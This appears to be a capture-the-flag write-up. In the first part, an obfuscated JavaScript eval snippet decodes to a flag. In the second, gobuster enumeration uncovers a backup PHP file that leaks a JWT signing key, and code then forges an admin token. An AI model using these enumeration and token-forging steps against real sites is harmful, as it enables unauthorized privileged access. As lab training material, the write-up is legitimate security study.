## 1.
```
// secret.js
var pass = unescape("unescape%28%22String.fromCharCode%252867%252C68%252C68%252C67%252C50%252C49%252C123%252C95%252C32%252C68%252C101%252C48%252C98%252C102%252C117%252C36%252C99%252C97%252C116%252C101%252C100%252C45%252C70%252C33%252C97%252C71%252C95%252C125%2529%22%29");

eval(eval(pass))
```

## 2. 
1. Visit `/stage-03-03/`, we get a cookie
```
token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwibmFtZSI6IkN5YmVyQm90MyIsImlhdCI6IiAxNjIzODY3NDg3IiwiaXNfYWRtaW4iOiIwIn0.YBMeZkOWZOju82ZKeMoIXHi425jocpr0axMm8MlASVE
```
2. Run gobuster to scan backup files
```
gobuster dir -u http://122.248.246.76/8NR7Z67K/stage-03-03/ -w /opt/SecLists/Discovery/Web-Content/common.txt -o stag.gobuster -d
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://122.248.246.76/8NR7Z67K/stage-03-03/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/24 10:05:28 Starting gobuster in directory enumeration mode
===============================================================
...
/index.php~           (Status: 200) [Size: 536]
```
3. And use the code in the `index.php~` to get flag.
```
<?php

require __DIR__ . '/vendor/autoload.php';

use \Firebase\JWT\JWT;

$key = 'sup3rw0rldk3y';

$payload = array(
    "username"=> "admin",
    "name"=> "CyberBot3",
    "iat"=>" 1623867487",
    "is_admin" => "1",
);

echo JWT::encode($payload, $key);
?>
```

